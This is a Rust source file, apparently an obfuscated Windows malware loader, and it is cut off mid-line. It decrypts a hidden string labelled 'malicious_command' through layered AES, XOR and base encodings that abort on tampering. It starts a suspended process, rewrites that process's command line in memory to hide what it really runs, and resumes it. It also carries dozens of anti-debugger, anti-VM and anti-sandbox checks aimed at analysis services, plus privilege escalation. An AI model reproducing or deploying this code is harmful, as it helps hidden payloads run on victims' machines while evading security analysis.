# ! [allow (non_snake_case)]
# ! [allow (unused_unsafe)]
mod power;
mod syscalls;
use anti_debug_rust;
use anti_sandbox;
use anti_vm;
use crate::anti_debug_rust::bad_processes;
use crate::anti_debug_rust::blacklisted_windows;
use crate::anti_debug_rust::debugger_detection;
use crate::anti_debug_rust::hooks_detection;
use crate::anti_debug_rust::parent_anti_debug;
use crate::anti_debug_rust::run_debug_checks;
use crate::anti_sandbox::admin_check;
use crate::anti_sandbox::all_tokens;
use crate::anti_sandbox::clean_environment_detection;
use crate::anti_sandbox::critical_process;
use crate::anti_sandbox::internet_check;
use crate::anti_sandbox::pc_uptime;
use crate::anti_sandbox::recent_file_activity;
use crate::anti_sandbox::repetitive_process;
use crate::anti_sandbox::run_environment_checks;
use crate::anti_sandbox::running_processes;
use crate::anti_sandbox::runtime_detector;
use crate::anti_sandbox::usb_check;
use crate::anti_sandbox::username_check;
use crate::anti_vm::anyrun_detection;
use crate::anti_vm::comodo_antivirus_detection;
use crate::anti_vm::deep_freeze_detection;
use crate::anti_vm::hyperv_check;
use crate::anti_vm::kvm_check;
use crate::anti_vm::monitor_metrics;
use crate::anti_vm::parallels_check;
use crate::anti_vm::qemu_check;
use crate::anti_vm::run_vm_checks;
use crate::anti_vm::sandboxie_detection;
use crate::anti_vm::shadow_defender_detection;
use crate::anti_vm::triage_detection;
use crate::anti_vm::virtualbox_detection;
use crate::anti_vm::vm_artifacts;
use crate::anti_vm::vm_platform_check;
use crate::anti_vm::vmware_detection;
use crate::syscalls::SYSCALLS;
use once_cell::sync::Lazy;
use power::run_all_checks;
use std::ffi::c_void;
use std::mem::size_of;
use std::mem::transmute;
use std::mem::zeroed;
use std::ptr::null_mut;
use windows_sys::Win32::Foundation::NTSTATUS;
use windows_sys::Win32::Foundation::UNICODE_STRING;
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
use windows_sys::Win32::System::Threading::CREATE_NEW_CONSOLE;
use windows_sys::Win32::System::Threading::CREATE_SUSPENDED;
use windows_sys::Win32::System::Threading::CreateProcessW;
use windows_sys::Win32::System::Threading::PEB;
use windows_sys::Win32::System::Threading::PROCESS_BASIC_INFORMATION;
use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;
use windows_sys::Win32::System::Threading::PROCESS_INFORMATION_CLASS;
use windows_sys::Win32::System::Threading::STARTUPINFOW;

#[inline(never)]
fn checksum_nlktrqvfprzh(data: &[u8]) -> u64 {
    let mut a = 1u64;
    let mut b = 0u64;
    for &byte in data {
        a = (a.wrapping_add(byte as u64)) % 65521;
        b = (b.wrapping_add(a)) % 65521;
    }
    (b << 32) | a
}

fn decode_ypitq_dgsufrf(encrypted: &[u8], key: &[u8], expected_sum: u64) -> &'static str {
    let s: String = {
        use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
        use aes::{Aes128, Aes192, Aes256};
        use base85; // using base85 for base85 decoding
        use bs58; // using bs58 for base58 decoding
        use base64::{engine::general_purpose, Engine as _};

        if key.len() < 88 { return Box::leak(String::from_utf8_lossy(encrypted).to_string().into_boxed_str()); }

        let xor_key = &key[0..16];
        let aes192_key = &key[16..40];
        let aes128_key = &key[40..56];
        let aes256_key = &key[56..88];

        let mut data = encrypted.to_vec();

        let cipher256 = Aes256::new(GenericArray::from_slice(aes256_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher256.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher128 = Aes128::new(GenericArray::from_slice(aes128_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher128.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher192 = Aes192::new(GenericArray::from_slice(aes192_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher192.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        if !data.is_empty() {
            let pad_len = data[data.len() - 1] as usize;
            if pad_len <= 16 && pad_len <= data.len() {
                data.truncate(data.len() - pad_len);
            }
        }

        let xor_decoded: Vec<u8> = data.iter().enumerate().map(|(i, &b)| b ^ xor_key[i % xor_key.len()]).collect();
        let hex_str = match String::from_utf8(xor_decoded) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base64_bytes = match hex::decode(&hex_str) { Ok(b) => b, Err(_) => return Box::leak(hex_str.into_boxed_str()) };
        let base64_str = match String::from_utf8(base64_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base32_bytes = match general_purpose::STANDARD.decode(&base64_str) { Ok(b) => b, Err(_) => return Box::leak(base64_str.into_boxed_str()) };
        let base32_str = match String::from_utf8(base32_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base58_bytes = match base32::decode(base32::Alphabet::Rfc4648 { padding: true }, &base32_str) { Some(b) => b, None => return Box::leak(base32_str.into_boxed_str()) };
        let base58_str = match String::from_utf8(base58_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base85_bytes = match bs58::decode(&base58_str).into_vec() { Ok(b) => b, Err(_) => return Box::leak(base58_str.into_boxed_str()) };
        let base85_str = match String::from_utf8(base85_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base45_bytes = match base85::decode(&base85_str) { Ok(b) => b, Err(_) => return Box::leak(base85_str.into_boxed_str()) };
        let base45_str = match String::from_utf8(base45_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };

        match base45::decode(&base45_str) {
            Ok(final_bytes) => {
                let runtime_sum = checksum_nlktrqvfprzh(&final_bytes);
                if runtime_sum != expected_sum {
                    // Tampering detected! Simulated volatile write (to valid memory) then abort.
                    unsafe {
                        let mut dummy: u8 = 0;
                        std::ptr::write_volatile(&mut dummy, 1);
                    }
                    std::process::abort();
                }
                String::from_utf8_lossy(&final_bytes).to_string()
            },
            Err(_) => base45_str,
        }
    };
    Box::leak(s.into_boxed_str())
}

        fn qquurag_p (s : & str) -> Vec < u16 > { s . encode_utf16 () . collect () } fn f_oggdzyu (s : & str , total_width : usize , padding_char : u16) -> Vec < u16 > { let mut wide = qquurag_p (s) ; if wide . len () < total_width { wide . resize (total_width , padding_char) ; } wide } fn x_gctkduh () { if zmsjzapj () { println ! ("ikinci de calisti vay anasini") ; } let malicious_command = decode_ypitq_dgsufrf (& [200 , 153 , 181 , 210 , 48 , 37 , 69 , 207 , 22 , 239 , 216 , 65 , 133 , 51 , 207 , 83 , 159 , 76 , 69 , 244 , 20 , 180 , 37 , 242 , 195 , 226 , 102 , 212 , 172 , 214 , 79 , 255 , 217 , 152 , 251 , 152 , 105 , 230 , 90 , 42 , 138 , 97 , 48 , 71 , 98 , 84 , 55 , 226 , 99 , 186 , 191 , 126 , 174 , 227 , 202 , 102 , 12 , 163 , 82 , 237 , 80 , 21 , 197 , 37 , 73 , 238 , 64 , 139 , 106 , 251 , 44 , 70 , 111 , 136 , 127 , 201 , 20 , 87 , 192 , 97 , 175 , 35 , 175 , 36 , 184 , 49 , 119 , 215 , 58 , 129 , 30 , 135 , 203 , 132 , 154 , 55 , 242 , 59 , 98 , 151 , 67 , 188 , 168 , 170 , 49 , 122 , 118 , 163 , 67 , 200 , 144 , 121 , 209 , 74 , 45 , 164 , 48 , 186 , 3 , 147 , 229 , 161 , 233 , 207 , 85 , 184 , 68 , 200 , 171 , 214 , 41 , 142 , 241 , 194 , 77 , 134 , 7 , 213 , 110 , 200 , 80 , 25 , 7 , 119 , 247 , 226 , 195 , 28 , 59 , 220 , 130 , 112 , 96 , 172 , 205 , 76 , 47 , 114 , 237 , 157 , 101 , 201 , 36 , 2 , 120 , 117 , 227 , 223 , 226 , 85 , 233 , 161 , 182 , 173 , 81 , 2 , 238 , 35 , 43 , 109 , 155 , 194 , 145 , 40 , 76 , 32 , 176 , 27 , 111 , 85 , 245 , 76 , 37 , 23 , 222 , 130 , 18 , 54 , 1 , 210 , 207 , 196 , 140 , 138 , 16 , 180 , 151 , 99 , 165 , 2 , 128 , 95 , 46 , 81 , 188 , 217 , 70 , 125 , 86 , 10 , 185 , 142 , 117 , 15 , 136 , 109 , 246 , 35 , 131 , 198 , 195 , 127 , 2 , 44 , 183 , 190 , 113 , 171 , 47 , 160 , 162 , 23 , 14 , 197 , 181 , 234 , 149 , 144 , 133 , 8 , 38 , 11 , 192 , 239 , 244 , 251 , 126 , 42 , 2 , 208 , 94 , 88 , 10 , 1 , 98 , 167 , 139 , 112 , 248 , 115 , 158 , 59 , 46 , 181 , 158 , 137 , 102 , 146 , 74 , 48 , 117 , 84 , 205 , 181 , 79 , 194 , 207 , 45 , 236 , 171 , 128 , 202 , 31 , 160 , 202 , 29 , 56 , 96 , 233 , 226 , 205 , 31 , 224 , 106 , 47 , 20 , 93 , 64 , 110 , 178 , 90 , 22 , 117 , 63 , 67 , 101 , 253 , 204 , 21 , 28 , 88 , 141 , 46 , 138 , 196 , 212 , 59 , 200 , 200 , 60 , 227 , 36 , 23 , 20 , 156 , 44 , 15 , 57 , 155 , 221 , 33 , 243 , 97 , 237 , 145 , 59 , 162 , 155 , 147 , 82 , 245 , 160 , 118 , 236 , 218 , 126 , 236 , 229 , 161 , 161 , 231 , 151 , 162 , 135 , 144 , 0 , 164 , 171 , 68 , 189 , 210 , 75 , 96 , 41 , 182 , 98 , 106 , 198 , 114 , 161 , 127 , 175 , 70 , 115 , 39 , 226 , 159 , 136 , 25 , 135 , 171 , 35 , 131 , 225 , 103 , 200 , 253 , 115 , 178 , 25 , 241 , 65 , 199 , 184 , 94 , 150 , 111 , 68 , 96 , 213 , 116 , 16 , 72 , 197 , 0 , 86 , 174 , 15 , 11 , 96 , 214 , 49 , 91 , 177 , 213 , 124 , 144 , 104 , 119 , 228 , 116 , 30 , 243 , 176 , 165 , 40 , 174 , 137 , 69 , 174 , 201 , 86 , 132 , 54 , 150 , 178 , 28 , 221 , 3 , 133 , 255 , 165 , 197 , 227 , 12 , 12 , 33 , 192 , 207 , 205 , 143 , 46 , 109 , 36 , 20 , 93 , 101 , 186 , 87 , 51 , 114 , 48 , 117 , 209 , 117 , 127 , 35 , 184 , 152 , 102 , 214 , 102 , 79 , 219 , 209 , 76 , 113 , 214 , 66 , 75 , 66 , 91 , 148 , 203 , 13 , 142 , 194 , 27 , 187 , 20 , 239 , 188 , 151 , 73 , 164 , 78 , 66 , 69 , 87 , 214 , 60 , 121 , 16 , 165 , 4 , 242 , 243 , 198 , 145 , 128 , 138 , 57 , 219 , 53 , 236 , 79 , 154 , 225 , 46 , 98 , 57 , 56 , 50 , 71 , 225 , 114 , 145 , 100 , 254 , 72 , 181 , 44 , 60 , 24 , 45 , 218 , 25 , 74 , 162 , 130 , 82 , 116 , 18 , 224 , 248 , 90 , 162 , 176 , 233 , 244 , 187 , 67 , 120 , 238 , 204 , 155 , 8 , 145 , 122 , 19 , 246 , 166 , 233 , 95 , 55 , 218 , 26 , 217 , 199 , 161 , 112 , 134 , 1 , 48 , 86 , 9 , 62 , 222 , 146 , 130 , 15 , 202 , 47 , 201 , 170 , 153 , 18 , 174 , 216 , 148 , 209 , 114 , 82 , 20 , 103 , 233 , 86 , 163 , 212 , 93 , 200 , 218 , 238 , 159 , 146 , 164 , 176 , 64 , 203 , 183 , 126 , 128 , 211 , 133 , 18 , 145 , 44 , 106 , 75 , 4 , 123 , 89 , 206 , 189 , 24 , 238 , 91 , 138 , 228 , 167 , 83 , 177 , 76 , 118 , 166 , 179 , 141 , 175 , 235 , 84 , 88 , 189 , 92 , 88 , 73 , 212] , & [144 , 153 , 156 , 38 , 61 , 167 , 183 , 186 , 181 , 162 , 117 , 91 , 145 , 28 , 0 , 172 , 65 , 73 , 161 , 99 , 77 , 165 , 208 , 248 , 172 , 102 , 159 , 43 , 114 , 219 , 129 , 166 , 252 , 37 , 42 , 9 , 69 , 144 , 28 , 223 , 179 , 189 , 83 , 248 , 47 , 33 , 58 , 132 , 106 , 117 , 24 , 102 , 42 , 176 , 51 , 171 , 93 , 186 , 68 , 118 , 15 , 44 , 49 , 165 , 134 , 32 , 150 , 82 , 103 , 148 , 88 , 233 , 49 , 131 , 227 , 102 , 105 , 52 , 77 , 237 , 112 , 95 , 117 , 202 , 130 , 212 , 109 , 236] , 129132486726932u64) ; let malicious_command_wide = qquurag_p (& malicious_command) ; let spoofed_command_str = decode_ypitq_dgsufrf (& [253 , 241 , 234 , 50 , 170 , 33 , 110 , 199 , 175 , 14 , 3 , 176 , 95 , 169 , 172 , 95 , 212 , 216 , 207 , 231 , 214 , 137 , 223 , 212 , 162 , 172 , 124 , 146 , 30 , 155 , 201 , 192 , 119 , 171 , 32 , 162 , 6 , 245 , 26 , 12 , 29 , 72 , 244 , 22 , 86 , 61 , 61 , 78 , 230 , 160 , 114 , 134 , 3 , 180 , 128 , 134 , 125 , 50 , 86 , 231 , 9 , 107 , 204 , 241 , 200 , 213 , 112 , 182 , 90 , 163 , 101 , 175 , 199 , 76 , 37 , 31 , 52 , 152 , 208 , 114 , 154 , 0 , 106 , 222 , 27 , 187 , 97 , 235 , 108 , 49 , 118 , 144 , 174 , 64 , 60 , 164 , 35 , 95 , 70 , 127 , 217 , 15 , 144 , 119 , 242 , 216 , 87 , 238 , 6 , 41 , 198 , 174 , 69 , 192 , 64 , 117 , 86 , 19 , 222 , 178 , 14 , 224 , 218 , 173 , 19 , 52 , 39 , 198 , 117 , 184 , 123 , 226 , 11 , 92 , 155 , 212 , 163 , 76 , 238 , 147 , 24 , 174 , 244 , 217 , 61 , 171 , 165 , 45 , 26 , 113 , 28 , 45 , 123 , 79 , 171 , 12 , 54 , 133 , 0 , 224 , 236 , 200 , 142 , 219 , 33 , 70 , 208 , 127 , 90 , 250 , 127 , 83 , 151 , 208 , 231 , 55 , 183 , 81 , 193 , 40 , 1 , 182 , 16 , 200 , 248 , 172 , 39 , 99 , 60 , 91 , 1 , 11] , & [187 , 121 , 98 , 240 , 167 , 176 , 90 , 174 , 231 , 97 , 205 , 76 , 190 , 218 , 1 , 18 , 156 , 159 , 142 , 253 , 80 , 93 , 165 , 155 , 88 , 82 , 204 , 30 , 153 , 69 , 82 , 255 , 172 , 190 , 45 , 34 , 47 , 161 , 60 , 155 , 141 , 201 , 58 , 230 , 75 , 255 , 180 , 169 , 232 , 126 , 254 , 105 , 200 , 86 , 127 , 224 , 179 , 103 , 82 , 124 , 189 , 203 , 150 , 54 , 58 , 144 , 178 , 68 , 143 , 94 , 150 , 254 , 207 , 253 , 172 , 226 , 41 , 33 , 153 , 26 , 215 , 68 , 206 , 11 , 169 , 29 , 42 , 11] , 48507360642486u64) ; let mut spoofed_command_wide = f_oggdzyu (spoofed_command_str , malicious_command . len () , ' ' as u16) ; spoofed_command_wide . push (0) ; let mut si : STARTUPINFOW = unsafe { zeroed () } ; si . cb = size_of :: < STARTUPINFOW > () as u32 ; let mut sa : SECURITY_ATTRIBUTES = unsafe { zeroed () } ; sa . nLength = size_of :: < SECURITY_ATTRIBUTES > () as u32 ; let mut pi : PROCESS_INFORMATION = unsafe { zeroed () } ; let mut current_dir = qquurag_p (decode_ypitq_dgsufrf (& [49 , 224 , 1 , 3 , 160 , 135 , 60 , 151 , 248 , 208 , 200 , 160 , 246 , 130 , 140 , 243 , 97 , 225 , 188 , 91 , 163 , 237 , 89 , 56 , 174 , 107 , 205 , 239 , 147 , 84 , 255 , 250 , 210 , 143 , 121 , 38 , 213 , 250 , 215 , 125 , 1 , 94 , 113 , 244 , 201 , 202 , 156 , 109 , 23 , 55 , 176 , 64 , 90 , 179 , 93 , 141 , 14 , 0 , 52 , 21 , 177 , 165 , 66 , 62 , 220 , 143 , 59 , 136 , 193 , 27 , 239 , 12 , 160 , 48 , 164 , 103 , 159 , 28 , 51 , 11 , 74 , 231 , 236 , 17 , 57 , 86 , 212 , 181 , 13 , 24 , 209 , 202 , 124 , 210 , 254 , 228 , 171 , 173 , 47 , 63 , 175 , 125 , 170 , 134 , 117 , 165 , 107 , 23 , 114 , 121 , 206 , 189 , 95 , 55 , 247 , 250 , 90 , 251 , 107 , 185 , 32 , 1 , 167 , 71 , 214 , 191 , 141 , 157 , 45 , 115 , 100 , 204 , 153 , 76 , 173 , 195 , 80 , 16 , 249 , 37 , 186 , 228 , 16 , 173] , & [109 , 197 , 64 , 159 , 98 , 161 , 213 , 211 , 39 , 221 , 36 , 234 , 244 , 167 , 173 , 191 , 102 , 81 , 135 , 106 , 129 , 245 , 255 , 171 , 134 , 41 , 16 , 250 , 62 , 113 , 77 , 141 , 120 , 172 , 132 , 196 , 11 , 170 , 68 , 172 , 58 , 141 , 0 , 51 , 231 , 108 , 66 , 202 , 21 , 184 , 159 , 133 , 55 , 3 , 133 , 213 , 78 , 26 , 193 , 148 , 221 , 119 , 24 , 91 , 22 , 61 , 110 , 169 , 2 , 199 , 118 , 55 , 68 , 218 , 92 , 15 , 105 , 64 , 109 , 42 , 172 , 140 , 3 , 75 , 89 , 4 , 146 , 227] , 26310969656385u64)) ; current_dir . push (0) ; let success = unsafe { CreateProcessW (null_mut () , spoofed_command_wide . as_mut_ptr () , & mut sa , & mut sa , 0 , CREATE_SUSPENDED | CREATE_NEW_CONSOLE , null_mut () , current_dir . as_ptr () , & mut si , & mut pi ,) } ; if success == 0 { return ; } let mut pbi : PROCESS_BASIC_INFORMATION = unsafe { zeroed () } ; let mut return_length : u32 = 0 ; let status : NTSTATUS = (dn_n_uelun . NtQueryInformationProcess) (pi . hProcess as * mut c_void , 0 as PROCESS_INFORMATION_CLASS , & mut pbi as * mut _ as * mut c_void , size_of :: < PROCESS_BASIC_INFORMATION > () as u32 , & mut return_length) ; if status != 0 { unsafe { let _ = (dn_n_uelun . NtClose) (pi . hProcess as * mut c_void) ; let _ = (dn_n_uelun . NtClose) (pi . hThread as * mut c_void) ; } return ; } let mut peb : PEB = unsafe { zeroed () } ; let mut bytes_read : usize = 0 ; let status = unsafe { (dn_n_uelun . NtReadVirtualMemory) (pi . hProcess as * mut c_void , pbi . PebBaseAddress as * mut c_void , & mut peb as * mut _ as * mut c_void , size_of :: < PEB > () , & mut bytes_read) } ; if status != 0 || bytes_read != size_of :: < PEB > () { unsafe { let _ = (dn_n_uelun . NtClose) (pi . hProcess as * mut c_void) ; let _ = (dn_n_uelun . NtClose) (pi . hThread as * mut c_void) ; } return ; } # [repr (C)] struct Params { _filler : [u8 ; (10 + 102)] , CommandLine : UNICODE_STRING , } let mut proc_params : Params = unsafe { zeroed () } ; let status = unsafe { (dn_n_uelun . NtReadVirtualMemory) (pi . hProcess as * mut c_void , peb . ProcessParameters as * mut c_void , & mut proc_params as * mut _ as * mut c_void , size_of :: < Params > () , & mut bytes_read) } ; if status != 0 || bytes_read != size_of :: < Params > () { unsafe { let _ = (dn_n_uelun . NtClose) (pi . hProcess as * mut c_void) ; let _ = (dn_n_uelun . NtClose) (pi . hThread as * mut c_void) ; } return ; } let mut bytes_written : usize = 0 ; let status = unsafe { (dn_n_uelun . NtWriteVirtualMemory) (pi . hProcess as * mut c_void , proc_params . CommandLine . Buffer as * mut c_void , malicious_command_wide . as_ptr () as * mut c_void , malicious_command_wide . len () * 2 , & mut bytes_written) } ; if status != 0 { unsafe { let _ = (dn_n_uelun . NtClose) (pi . hProcess as * mut c_void) ; let _ = (dn_n_uelun . NtClose) (pi . hThread as * mut c_void) ; } return ; } let cmd_line_len = (spoofed_command_str . len () * 2) as u16 ; let status = unsafe { let len_address = (peb . ProcessParameters as * mut u8) . add ((33 + 79)) ; (dn_n_uelun . NtWriteVirtualMemory) (pi . hProcess as * mut c_void , len_address as * mut c_void , & cmd_line_len as * const _ as * mut c_void , size_of :: < u16 > () , & mut bytes_written) } ; if status != 0 { unsafe { let _ = (dn_n_uelun . NtClose) (pi . hProcess as * mut c_void) ; let _ = (dn_n_uelun . NtClose) (pi . hThread as * mut c_void) ; } return ; } unsafe { let mut suspend_count : u32 = 0 ; let _ = (dn_n_uelun . NtResumeThread) (pi . hThread as * mut c_void , & mut suspend_count) ; let _ = (dn_n_uelun . NtClose) (pi . hProcess as * mut c_void) ; let _ = (dn_n_uelun . NtClose) (pi . hThread as * mut c_void) ; } }          pub fn lcdq_ncjr () -> bool { if ! runtime_detector :: is_windows () { return false ; } if ! admin_check :: is_admin () { if let Err (_) = admin_check :: elevate_process () { } } if admin_check :: is_admin () { let _ = all_tokens :: enable () ; } zmsjzapj () } pub fn u_vcvuwei () -> bool { if ! runtime_detector :: is_windows () { return false ; } if run_debug_checks () { return true ; } if run_vm_checks () { return true ; } if run_environment_checks () { return true ; } if vbnmhgrl () { return true ; } false } pub fn zmsjzapj () -> bool { if debugger_detection :: is_debugger_present () { println ! ("[anti_debug_rust] debugger_detection::is_debugger_present") ; return true ; } if debugger_detection :: check_remote_debugger () . unwrap_or (false) { println ! ("[anti_debug_rust] debugger_detection::check_remote_debugger") ; return true ; } if parent_anti_debug :: parent_anti_debug () { println ! ("[anti_debug_rust] parent_anti_debug::parent_anti_debug") ; return true ; } if pc_uptime :: check_uptime ((183 + 417)) . unwrap_or (false) { println ! ("[anti_sandbox] pc_uptime::check_uptime") ; return true ; } if bad_processes :: detect () . unwrap_or (false) { println ! ("[anti_debug_rust] bad_processes::detect") ; return true ; } if running_processes :: check_running_processes_count ((2 + 48)) . unwrap_or (false) { println ! ("[anti_sandbox] running_processes::check_running_processes_count") ; return true ; } if blacklisted_windows :: check_blacklisted_windows () { println ! ("[anti_debug_rust] blacklisted_windows::check_blacklisted_windows") ; return true ; } if hooks_detection :: detect_hooks_on_common_winapi_functions (None , None) { println ! ("[anti_debug_rust] hooks_detection::detect_hooks_on_common_winapi_functions") ; return true ; } if shadow_defender_detection :: detect_shadow_defender () { println ! ("[anti_vm] shadow_defender_detection::detect_shadow_defender") ; return true ; } if anyrun_detection :: anyrun_detection () . unwrap_or (false) { println ! ("[anti_sandbox] anyrun_detection::anyrun_detection") ; return true ; } if ! clean_environment_detection :: detect_clean_environment () { println ! ("[anti_sandbox] clean_environment_detection::detect_clean_environment (too clean)") ; return true ; } if comodo_antivirus_detection :: detect_comodo_antivirus () { println ! ("[anti_sandbox] comodo_antivirus_detection::detect_comodo_antivirus") ; return true ; } if deep_freeze_detection :: detect_deep_freeze () { println ! ("[anti_vm] deep_freeze_detection::detect_deep_freeze") ; return true ; } if hyperv_check :: detect_hyperv () . unwrap_or (false) { println ! ("[anti_vm] hyperv_check::detect_hyperv") ; return true ; } if kvm_check :: check_for_kvm () . unwrap_or (false) { println ! ("[anti_vm] kvm_check::check_for_kvm") ; return true ; } if monitor_metrics :: is_screen_small () . unwrap_or (false) { println ! ("[anti_sandbox] monitor_metrics::is_screen_small") ; return true ; } if parallels_check :: check_for_parallels () . unwrap_or (false) { println ! ("[anti_vm] parallels_check::check_for_parallels") ; return true ; } if qemu_check :: check_for_qemu () . unwrap_or (false) { println ! ("[anti_vm] qemu_check::check_for_qemu") ; return true ; } if recent_file_activity :: recent_file_activity_check () . unwrap_or (false) { println ! ("[anti_sandbox] recent_file_activity::recent_file_activity_check") ; return true ; } if repetitive_process :: check () . unwrap_or (false) { println ! ("[anti_sandbox] repetitive_process::check") ; return true ; } if sandboxie_detection :: detect_sandboxie () { println ! ("[anti_sandbox] sandboxie_detection::detect_sandboxie") ; return true ; } if triage_detection :: triage_check () . unwrap_or (false) { println ! ("[anti_sandbox] triage_detection::triage_check") ; return true ; } if usb_check :: plugged_in () . unwrap_or (true) == false { println ! ("[anti_sandbox] usb_check::plugged_in (no USB devices)") ; return true ; } if username_check :: check_for_blacklisted_names () { println ! ("[anti_sandbox] username_check::check_for_blacklisted_names") ; return true ; } if virtualbox_detection :: graphics_card_check () . unwrap_or (false) { println ! ("[anti_vm] virtualbox_detection::graphics_card_check") ; return true ; } if vm_artifacts :: vm_artifacts_detect () { println ! ("[anti_vm] vm_artifacts::vm_artifacts_detect") ; return true ; } if vm_platform_check :: detect_vm_platform () . unwrap_or (false) { println ! ("[anti_vm] vm_platform_check::detect_vm_platform") ; return true ; } if vmware_detection :: graphics_card_check () . unwrap_or (false) { println ! ("[anti_vm] vmware_detection::graphics_card_check") ; return true ; } if internet_check :: check_connection () . unwrap_or (true) == false { println ! ("[anti_sandbox] internet_check::check_connection") ; return true ; } false } pub fn vbnmhgrl () -> bool { bad_processes :: detect () . unwrap_or (false) || blacklisted_windows :: check_blacklisted_windows () } pub struct orgxgr_fm { pub enable_debug_checks : bool , pub enable_vm_checks : bool , pub enable_environment_checks : bool , pub enable_process_checks : bool , pub min_uptime_seconds : u32 , pub min_process_count : usize , pub min_installed_programs : usize , pub enable_internet_check : bool , pub enable_usb_check : bool , pub enable_admin_escalation : bool , pub enable_privilege_escalation : bool , pub enable_critical_process : bool , } impl Default for orgxgr_fm { fn default () -> Self { Self { enable_debug_checks : true , enable_vm_checks : true , enable_environment_checks : true , enable_process_checks : true , min_uptime_seconds : (108 + 492) , min_process_count : (20 + 30) , min_installed_programs : 10 , enable_internet_check : true , enable_usb_check : true , enable_admin_escalation : true , enable_privilege_escalation : true , enable_critical_process : true , } } } # [cfg (test)] mod tests { # [test] fn jwazt_gr_v () { println ! ("Detected OS: {:?}" , runtime_detector :: detect_os ()) ; assert_eq ! (runtime_detector :: is_windows () , cfg ! (windows)) ; } # [test] fn w_nq_caqez () { println ! ("Running as admin: {}" , admin_check :: is_admin ()) ; } # [test] fn emnjnf_ub () { println ! ("Debugger present: {}" , debugger_detection :: is_debugger_present ()) ; } # [test] fn dcrtxkus () { if let Ok (result) = debugger_detection :: check_remote_debugger () { println ! ("Remote debugger present: {}" , result) ; } } # [test] fn wcfdnqty () { println ! ("Suspicious parent process: {}" , parent_anti_debug :: parent_anti_debug ()) ; } # [test] fn mebnudlg () { if let Ok (uptime) = pc_uptime :: get_uptime_in_seconds () { println ! ("System uptime: {} seconds" , uptime) ; } } # [test] fn ufjery_w_w () { if let Ok (count) = running_processes :: get_running_processes_count () { println ! ("Running processes: {}" , count) ; } } # [test] fn wzwxspgh () { if let Ok (result) = bad_processes :: detect () { println ! ("Bad processes detected: {}" , result) ; } } # [test] fn bhikecan () { println ! ("VM environment detected: {}" , run_vm_checks ()) ; } # [test] fn mzsdzrac () { println ! ("Suspicious environment detected: {}" , run_environment_checks ()) ; } # [test] fn ywmd_pfmm () { if let Ok (connected) = internet_check :: check_connection () { println ! ("Internet connection available: {}" , connected) ; } } # [test] fn cv_uoesfx () { if let Ok (small_screen) = monitor_metrics :: is_screen_small () { println ! ("Small screen detected: {}" , small_screen) ; } } # [test] fn e_xgdmzbe () { println ! ("Blacklisted username: {}" , username_check :: check_for_blacklisted_names ()) ; } # [test] fn nqkfm_dno () { if let Ok (usb_detected) = usb_check :: plugged_in () { println ! ("USB devices detected: {}" , usb_detected) ; } } # [test] fn vprblx_t_b () { println ! ("Clean environment (10+ programs): {}" , clean_environment_detection :: detect_clean_environment ()) ; } # [test] fn dwsnakqj () { if admin_check :: is_admin () { match all_tokens :: enable () { Ok (_) => println ! ("Successfully enabled all available privileges") , Err (e) => println ! ("Failed to enable privileges: {}" , e) , } } else { println ! ("Not running as admin, cannot test privilege escalation") ; } } # [test] fn uafef_htp () { let detected = zmsjzapj () ; println ! ("Anti-analysis measures detected: {}" , detected) ; println ! ("Debug checks: {}" , run_debug_checks ()) ; println ! ("VM checks: {}" , run_vm_checks ()) ; println ! ("Environment checks: {}" , run_environment_checks ()) ; println ! ("Process checks: {}" , run_process_checks ()) ; } # [test] fn klkorwxk () { if runtime_detector :: is_windows () { let detected = u_vcvuwei () ; println ! ("Windows-specific checks detected threats: {}" , detected) ; } else { println ! ("Not running on Windows, skipping Windows-specific tests") ; } } }      type NtQueryInformationProcess = extern "system" fn (ProcessHandle : * mut c_void , ProcessInformationClass : PROCESS_INFORMATION_CLASS , ProcessInformation : * mut c_void , ProcessInformationLength : u32 , ReturnLength : * mut u32 ,) -> i32 ; type NtClose = extern "system" fn (Handle : * mut c_void) -> i32 ; type NtReadVirtualMemory = extern "system" fn (ProcessHandle : * mut c_void , BaseAddress : * mut c_void , Buffer : * mut c_void , NumberOfBytesToRead : usize , NumberOfBytesRead : * mut usize ,) -> i32 ; type NtWriteVirtualMemory = extern "system" fn (ProcessHandle : * mut c_void , BaseAddress : * mut c_void , Buffer : * mut c_void , NumberOfBytesToWrite : usize , NumberOfBytesWritten : * mut usize ,) -> i32 ; type NtResumeThread = extern "system" fn (ThreadHandle : * mut c_void , SuspendCount : * mut u32 ,) -> i32 ; # [derive (Clone)] pub struct Syscalls { pub NtQueryInformationProcess : NtQueryInformationProcess , pub NtClose : NtClose , pub NtReadVirtualMemory : NtReadVirtualMemory , pub NtWriteVirtualMemory : NtWriteVirtualMemory , pub NtResumeThread : NtResumeThread , } impl Syscalls { fn new () -> Result < Self , & 'static str > { unsafe { let ntdll = LoadLibraryA (decode_ypitq_dgsufrf (& [181 , 146 , 25 , 247 , 223 , 135 , 101 , 107 , 13 , 169 , 89 , 106 , 173 , 14 , 3 , 126 , 146 , 36 , 202 , 124 , 111 , 21 , 8 , 215 , 208 , 116 , 48 , 207 , 0 , 109 , 40 , 131 , 215 , 90 , 119 , 7 , 5 , 214 , 91 , 60 , 130 , 9 , 9 , 51 , 31 , 176 , 233 , 118 , 136 , 101 , 200 , 31 , 245 , 184 , 19 , 37 , 117 , 55 , 140 , 14 , 2 , 36 , 234 , 153 , 115 , 254 , 3 , 183 , 51 , 1 , 235 , 217 , 46 , 221 , 148 , 1 , 121 , 156 , 13 , 237 , 79 , 131 , 15 , 140 , 118 , 5 , 74 , 116 , 229 , 176 , 96 , 121 , 99 , 150 